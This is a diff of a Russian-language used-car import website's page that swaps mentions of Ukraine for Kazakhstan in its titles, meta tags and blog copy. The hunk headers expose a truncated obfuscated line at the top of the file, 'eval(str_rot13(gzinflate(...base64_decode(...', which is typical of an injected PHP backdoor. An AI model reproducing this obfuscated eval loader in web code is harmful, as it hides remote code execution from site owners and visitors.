@@ -6,7 +6,7 @@ eval(str_rot13(gzinflate(str_rot13(base64_decode('LUrFDsRJEvyaKNmbGbQnMzP7sjIzs7
 <html class="wide wow-animation" lang="ru">
   <head>
     <!-- Site Title-->
-    <title>Купить БУ Авто из США и Грузии в Украине ✅ Цены от от 7,000$ |  Avtoraketa</title>
+    <title>Купить БУ Авто из США и Грузии в Казахстане  ✅ Цены от от 7,000$ |  Avtoraketa</title>
     <meta charset="utf-8">
 	<meta property="og:title" content="Avtoraketa - доставка авто из США и Грузии">
     <meta property="og:site_name" content="Avtoraketa">
@@ -14,7 +14,7 @@ eval(str_rot13(gzinflate(str_rot13(base64_decode('LUrFDsRJEvyaKNmbGbQnMzP7sjIzs7
     <meta property="og:description" content="Предоставляем улуги профессионального пригона авто из США и Грузии">
     <meta property="og:image" content="/images/avtoraketa.jpg">
 	<meta name="description" content="Авторакета - это выгодная покупка авто с аукционов Америки и авторынков Грузии">
-	<meta name="keywords" content="Авторакета: Поставщик автомобилей из Америки и Грузии в Украину, с аукционов Copart, Manheim, IAAI. Автомобили в наличии, автомобильный аукцион. Самая надежная компания, работа под ключ.">
+	<meta name="keywords" content="Авторакета: Поставщик автомобилей из Америки и Грузии в Казахстан , с аукционов Copart, Manheim, IAAI. Автомобили в наличии, автомобильный аукцион. Самая надежная компания, работа под ключ.">
     <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <script src="/cdn-cgi/apps/head/3ts2ksMwXvKRuG480KNifJ2_JNM.js"></script><link rel="icon" href="images/favicon.ico" type="image/x-icon">
@@ -285,7 +285,7 @@ src="https://www.facebook.com/tr?id=873801476872818&ev=PageView&noscript=1"
 				
 				<h5 align="center">Toyota Camry</h5>
 				<img src="images/usa-blog-camry.jpg" alt="купить camry из США" width="870" height="580"/>
-                <p>Кэмри одна из самых популярных и горячо любимая марка по всему миру! Американская версия существенно отличается по дизайну с европейским аналогом, вы точно на дороге узнаете её :)Если сравнивать Тойоту Кемри из США с её аналогом в Украине, то вы получите следующие приятные дополнения в виде: улучшенной шумоизоляции, доработанной коробки что сделало её более динамичной,доработанный руль с удобным расположением кнопок и комфортабельные сиденья. Всё вышеперечисленное + разница в цене (20-30% экономии из США) делает данный автомобиль очень выгодным и интересным к покупке. </p>
+                <p>Кэмри одна из самых популярных и горячо любимая марка по всему миру! Американская версия существенно отличается по дизайну с европейским аналогом, вы точно на дороге узнаете её :)Если сравнивать Тойоту Кемри из США с её аналогом в Казахстане , то вы получите следующие приятные дополнения в виде: улучшенной шумоизоляции, доработанной коробки что сделало её более динамичной,доработанный руль с удобным расположением кнопок и комфортабельные сиденья. Всё вышеперечисленное + разница в цене (20-30% экономии из США) делает данный автомобиль очень выгодным и интересным к покупке. </p>
                 <br>
 				
 				<h5 align="center">Audi A6</h5>
@@ -295,7 +295,7 @@ src="https://www.facebook.com/tr?id=873801476872818&ev=PageView&noscript=1"
 				
 				<h5 align="center">Mitsubishi Outlander</h5>
 				<img src="images/usa-blog-mits.jpg" alt="купить Mitsubishi Outlander из США" width="870" height="580"/>
-                <p>Обновлённая версия Аутлендера вырасла во всех смыслах, по сравнению с его прошлым поколением. Японцы хорошо потрудились над дизайном и доработкой множества недостатковпрошлой версии. Автомобиль стал не только надёжнее, но и значительно вырос в технических характеристиках проходимости. Компания Митсубиши уверенно зашла на американский рынок, который пользуется очень большим спросом в недорожниках и хорошо укрепилась в нём. Экономия в 40% делает этот внедорожник оеннь привлекательным к покупке и доставке из США в Украину. </p>
+                <p>Обновлённая версия Аутлендера вырасла во всех смыслах, по сравнению с его прошлым поколением. Японцы хорошо потрудились над дизайном и доработкой множества недостатковпрошлой версии. Автомобиль стал не только надёжнее, но и значительно вырос в технических характеристиках проходимости. Компания Митсубиши уверенно зашла на американский рынок, который пользуется очень большим спросом в недорожниках и хорошо укрепилась в нём. Экономия в 40% делает этот внедорожник оеннь привлекательным к покупке и доставке из США в Казахстан . </p>
                 <br>
 				
 				<h5 align="center">Lexus IS</h5>
@@ -318,14 +318,14 @@ src="https://www.facebook.com/tr?id=873801476872818&ev=PageView&noscript=1"
                       <div class="unit flex-row">
                         <div class="unit-left"><a href="avto-iz-gruzii.php"><img src="images/post-light-2-120x80.jpg" alt="Авто из Грузи в мариуполь" width="120" height="80"/></a></div>
                         <div class="unit-body">
-                          <p class="post-light-title"><a href="avto-iz-gruzii.php">Авто из Грузи и в Украину, плюсы и минусы.</a></p>
+                          <p class="post-light-title"><a href="avto-iz-gruzii.php">Авто из Грузи и в Казахстан , плюсы и минусы.</a></p>
                           <time class="post-light-time" datetime="2020">14 февраля, 2020 года</time>
                         </div>
                       </div>
                     </article>
                     <article class="post-light">
                       <div class="unit flex-row">
-                        <div class="unit-left"><a href="avto-iz-usa-coronavirus.php"><img src="images/post-light-01-120x80.jpg" alt="Авто из США в мариуполе" width="120" height="80"/></a></div>
+                        <div class="unit-left"><a href="avto-iz-usa-coronavirus.php"><img src="images/post-light-01-120x80.jpg" alt="Авто из США в Казахстане" width="120" height="80"/></a></div>
                         <div class="unit-body">
                           <p class="post-light-title"><a href="avto-iz-usa-coronavirus.php">Авто из США и короновирус: что делать?</a></p>
                           <time class="post-light-time" datetime="2020">24 марта, 2020 года</time>
@@ -347,7 +347,7 @@ src="https://www.facebook.com/tr?id=873801476872818&ev=PageView&noscript=1"
                       <div class="unit flex-row">
                         <div class="unit-left"><a href="top-10-avto-iz-usa.php"><img src="images/post-light-5-120x80.jpg" alt="авто из США до 8 000$" width="120" height="80"/></a></div>
                         <div class="unit-body">
-                          <p class="post-light-title"><a href="top-10-avto-iz-usa.php">ТОП 10 авто из США до 8 000$ для доставки в Украину.</a></p>
+                          <p class="post-light-title"><a href="top-10-avto-iz-usa.php">ТОП 10 авто из США до 8 000$ для доставки в Казахстан .</a></p>
                           <time class="post-light-time" datetime="2020">16 января, 2020 года</time>
                         </div>
                       </div>
